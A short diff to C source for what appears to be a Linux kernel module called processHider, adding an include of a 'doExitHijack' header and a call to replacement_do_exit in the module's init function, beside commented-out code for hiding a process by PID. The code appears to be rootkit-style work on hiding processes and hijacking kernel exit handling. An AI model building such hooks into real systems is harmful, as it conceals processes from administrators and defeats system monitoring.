@@ -3,6 +3,7 @@
 #include <linux/rculist.h>
 
 #include "processHider.h"
+#include "doExitHijack.h"
 
 
 // prototypes for functions from pid.c
@@ -20,7 +21,7 @@ int processHider_init(void) {
 	//TODO: only hide proccess when wanted ...
 	//pid_t pid = 2404; //TODO: change this 
 	//hideProcess(pid);
-	
+	replacement_do_exit(0);
 	return 0;
 }
 
